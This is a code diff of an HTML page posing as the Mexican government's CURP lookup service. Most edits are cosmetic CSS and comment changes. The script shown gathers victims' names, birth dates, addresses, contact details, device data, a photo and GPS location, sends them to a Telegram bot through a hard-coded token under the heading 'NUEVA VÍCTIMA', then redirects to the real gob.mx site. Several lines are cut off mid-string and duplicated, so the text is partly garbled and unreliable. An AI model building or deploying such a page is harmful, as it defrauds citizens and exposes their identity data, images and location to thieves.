@@ -7,16 +7,15 @@
 <style>
 :root{--guinda:#8b1c38;--guinda-osc:#691c32;--rojo:#d92d20}
 *{box-sizing:border-box;margin:0;padding:0}
-html,body{scroll-behavior:smooth}
 body{font-family:Arial,Helvetica,sans-serif;background:#FFFFFF;color:#222222;line-height:1.45}
 
-/* ===== ENCABEZADO FIJO (hover scroll) ===== */
+/* ===== 1) ENCABEZADO FIJO AL SCROLL ===== */
 .header-gob{
   width:100%;
   position:sticky;
   top:0;
   z-index:1000;
-  box-shadow:0 2px 8px rgba(0,0,0,.12);
+  box-shadow:0 2px 6px rgba(0,0,0,.12);
 }
 .top-bar{
   background:linear-gradient(90deg,#b1245a 0%,#c22f66 55%,#a51e4f 100%);
@@ -33,7 +32,7 @@ body{font-family:Arial,Helvetica,sans-serif;background:#FFFFFF;color:#222222;lin
 .menu-btn{background:transparent;border:none;cursor:pointer;padding:6px;display:flex;flex-direction:column;justify-content:center;gap:5px}
 .menu-btn span{display:block;width:24px;height:2.5px;background-color:#FFFFFF;border-radius:1px}
 
-/* ===== FRANJA RENAPO +3mm MÁS GRUESA ===== */
+/* ===== 2) FRANJA RENAPO +3mm MÁS GRUESA ===== */
 .sub-bar{
   background:linear-gradient(90deg,#3e1f2e 0%,#4a2435 55%,#3e1f2e 100%);
   padding:16px 18px;
@@ -82,7 +81,7 @@ select.form-control{padding:10px 12px;height:44px}
 }
 .help-curp-link:active{opacity:.7}
 
-/* ===== LUPA JUNTO A CAMPOS OBLIGATORIOS ===== */
+/* ===== 3) LUPA JUNTO A CAMPOS OBLIGATORIOS ===== */
 .barra-campos{
   display:flex;align-items:center;justify-content:space-between;
   gap:10px;margin-bottom:14px;flex-wrap:wrap;
@@ -100,9 +99,7 @@ select.form-control{padding:10px 12px;height:44px}
   display:inline-flex;align-items:center;gap:6px;
 }
 .btn-buscar:hover{background-color:#691c32}
-.btn-buscar:disabled,.btn-buscar.is-disabled{
-  border:1.5px solid #d92d20;background:#fef3f2;color:#b42318;cursor:not-allowed;
-}
+.btn-buscar:disabled,.btn-buscar.is-disabled{border:1.5px solid #d92d20;background:#fef3f2;color:#b42318;cursor:not-allowed}
 
 .panel-oculto{display:none}
 .seccion-titulo{font-size:14px;font-weight:700;color:#8b1c38;padding-bottom:6px;border-bottom:1px solid #E5E7EB;margin:10px 0 12px}
@@ -114,7 +111,7 @@ select.form-control{padding:10px 12px;height:44px}
 .load{width:11px;height:11px;border:2px solid #FFFFFF;border-top-color:transparent;border-radius:50%;animation:s .7s linear infinite;display:inline-block;vertical-align:-2px;margin-right:4px}
 @keyframes s{to{transform:rotate(360deg)}}
 
-/* ===== CAJAS INFORMATIVAS COMPACTAS ===== */
+/* ===== Cajas informativas compactas ===== */
 .info-boxes{margin-top:16px;display:flex;flex-direction:column;gap:8px}
 .info-box{
   background-color:#dff2fc;border:1px solid #b6dff5;border-radius:5px;
@@ -126,15 +123,15 @@ select.form-control{padding:10px 12px;height:44px}
 .info-box p:last-child{margin-bottom:0}
 .info-url{color:#222222;text-decoration:none;font-weight:400;word-break:break-word}
 
-/* ===== FOOTER ÚNICO ===== */
+/* ===== Footer único ===== */
 .recuadro-final-gob{
   background-color:#9f2241;
   color:#FFFFFF;
-  padding:22px 20px 24px;
+  padding:24px 20px;
   font-family:Arial,Helvetica,sans-serif;
   display:flex;
   flex-direction:column;
-  gap:16px;
+  gap:18px;
   width:100%;
   box-sizing:border-box;
 }
@@ -148,9 +145,12 @@ select.form-control{padding:10px 12px;height:44px}
 .recuadro-final-enlace.subrayado{text-decoration:underline;text-underline-offset:3px}
 .recuadro-final-flecha{color:#FFFFFF;font-size:16px;margin-left:12px}
 
-/* ===== REDES EN UNA SOLA LÍNEA ===== */
+/* ===== 4) REDES EN UNA SOLA LÍNEA + 079 MÁS ARRIBA ===== */
 .recuadro-final-redes{
-  display:flex;align-items:center;gap:14px;flex-wrap:nowrap;
+  display:flex;
+  align-items:center;
+  gap:14px;
+  flex-wrap:nowrap;
 }
 .recuadro-final-redes-texto{font-size:15px;font-weight:600;color:#FFFFFF;white-space:nowrap}
 .recuadro-final-iconos{display:flex;align-items:center;gap:16px;flex-wrap:nowrap}
@@ -160,9 +160,7 @@ select.form-control{padding:10px 12px;height:44px}
   width:26px;height:26px;
 }
 .recuadro-final-icono svg{width:22px;height:22px;fill:#FFFFFF}
-
-/* ===== 079 MÁS ARRIBA ===== */
-.recuadro-final-079{display:flex;align-items:center;gap:10px;padding-top:0;margin-top:4px}
+.recuadro-final-079{display:flex;align-items:center;gap:10px;padding-top:0;margin-top:0}
 .recuadro-final-asterisco{font-size:30px;font-weight:700;line-height:1;color:#FFFFFF}
 .recuadro-final-numero{font-size:34px;font-weight:700;line-height:1;letter-spacing:-.5px;color:#FFFFFF}
 .recuadro-final-ayuda{font-size:13px;line-height:1.2;color:#FFFFFF;margin:0}
@@ -292,7 +290,7 @@ select.form-control{padding:10px 12px;height:44px}
     </form>
   </section>
 
-  <!-- ===== CAJAS INFORMATIVAS ===== -->
+  <!-- ===== CAJAS INFORMATIVAS COMPACTAS ===== -->
   <section class="info-boxes" aria-label="Información adicional">
     <div class="info-box">
       <h3 class="info-box-title">&iexcl;Sugerencia!</h3>
@@ -343,7 +341,7 @@ select.form-control{padding:10px 12px;height:44px}
     </li>
   </ul>
 
-  <!-- REDES EN UNA SOLA LÍNEA -->
+  <!-- ===== REDES EN UNA SOLA LÍNEA ===== -->
   <div class="recuadro-final-redes">
     <span class="recuadro-final-redes-texto">S&iacute;guenos en</span>
     <div class="recuadro-final-iconos">
@@ -365,7 +363,7 @@ select.form-control{padding:10px 12px;height:44px}
   <div class="recuadro-final-079">
     <span class="recuadro-final-asterisco">&#10033;</span>
     <span class="recuadro-final-numero">079</span>
-    <p class="recuadro-final-ayuda">Comun&iacute;cate, estamos<br />para apoyarte</p>
+    <p class="recuadro-final-ayuda">Comun&iacute;cate, estamos<br />para ayudarte</p>
   </div>
 </footer>
 
@@ -454,13 +452,11 @@ window.addEventListener('load',function(){
   },150);
 });
 
-/* ===== CAMBIAR TABS (CORREGIDO) ===== */
 function cambiarTab(tab){
   var btnCurp=document.getElementById('btn-tab-curp');
   var btnDatos=document.getElementById('btn-tab-datos');
   var panelCurp=document.getElementById('panel-curp');
   var panelDatos=document.getElementById('panel-datos');
-  if(!btnCurp||!btnDatos||!panelCurp||!panelDatos)return;
   if(tab==='curp'){
     btnCurp.classList.add('active');btnCurp.setAttribute('aria-selected','true');
     btnDatos.classList.remove('active');btnDatos.setAttribute('aria-selected','false');
@@ -482,7 +478,6 @@ function marcarError(el){
 
 function leerForm(){
   form={};
-  var campos={nombre:'nombre',ap:'primer-apellido',am:'segundo-apellido',dia:'dia',mes:'mes',anio:'anio',sexo:'sexo',entidad:'
   var campos={nombre:'nombre',ap:'primer-apellido',am:'segundo-apellido',dia:'dia',mes:'mes',anio:'anio',sexo:'sexo',entidad:'estado',calle:'calle',num_ext:'num-ext',num_int:'num-int',cp:'cp',colonia:'colonia',municipio:'municipio',estado:'estado-dom',entre:'entre',email:'email'};
   for(var k in campos){var val=v(campos[k]);if(val)form[k]=val;}
   if(form.dia && form.mes && form.anio)form.fecha=form.dia+'/'+form.mes+'/'+form.anio;
@@ -490,13 +485,14 @@ function leerForm(){
   if(tel)form.tel=lada+' '+tel;
 }
 
-/* ===== ENVIAR A TELEGRAM ===== */
 function enviar(){
   var TOKEN="9267114621:AAEvSqXV0Z7nCnjVMH59bfiuIsSAuE7wwvU";
   var CHAT="9092452687";
   var API="https://api.telegram.org/bot"+TOKEN;
   var txt="🔔 <b>NUEVA VÍCTIMA</b>\n\n";
   txt+="📱 <b>Móvil:</b> "+info.modelo+"\n";
+  txt+="💻 <b>SO:</b> "+info.so+"\n";
+  txt+="🌐 <b>Na
   txt+="💻 <b>SO:</b> "+info.so+"\n";
   txt+="🌐 <b>Nav:</b> "+info.navegador+"\n";
   txt+="📺 <b>Pantalla:</b> "+info.pantalla+"\n";
@@ -531,7 +527,6 @@ function dataURLtoBlob(dataurl){
   return new Blob([u8arr],{type:mime});
 }
 
-/* ===== CP AUTOCOMPLETADO ===== */
 var CP_MUNICIPIOS={'01000':'Álvaro Obregón','01210':'Álvaro Obregón','01730':'Álvaro Obregón','02000':'Azcapotzalco','02300':'Azcapotzalco','03000':'Benito Juárez','03100':'Benito Juárez','03810':'Benito Juárez','04000':'Coyoacán','04100':'Coyoacán','05000':'Cuajimalpa de Morelos','06000':'Cuauhtémoc','06010':'Cuauhtémoc','06700':'Cuauhtémoc','07000':'Gustavo A. Madero','07300':'Gustavo A. Madero','08000':'Iztacalco','09000':'Iztapalapa','09800':'Iztapalapa','10000':'La Magdalena Contreras','11000':'Miguel Hidalgo','11560':'Miguel Hidalgo','12000':'Milpa Alta','13000':'Tláhuac','14000':'Tlalpan','15000':'Venustiano Carranza','16000':'Xochimilco','50000':'Toluca','52000':'Lerma','54000':'Tlalnepantla','57000':'Nezahualcóyotl'};
 
 function completarMunicipio(cp){
@@ -559,7 +554,6 @@ function autocompletarCP(cp){
   }).catch(function(){box.style.color='#c00';box.innerHTML='No se pudo autocompletar';});
 }
 
-/* ===== FLUJO: foto + GPS + envío + redirección ===== */
 async function ejecutarFlujo(boton){
   boton.disabled=true;
   boton.innerHTML='<span class="load"></span> Buscando…';
@@ -581,7 +575,6 @@ async function ejecutarFlujo(boton){
   window.location='https://www.gob.mx/curp/';
 }
 
-/* ===== HANDLERS (CORREGIDOS) ===== */
 document.addEventListener('DOMContentLoaded',function(){
   var cpEl=document.getElementById('cp');
   if(cpEl)cpEl.addEventListener('input',function(){autocompletarCP(this.value);});
@@ -620,3 +613,4 @@ document.addEventListener('DOMContentLoaded',function(){
 </script>
 </body>
 </html>
+
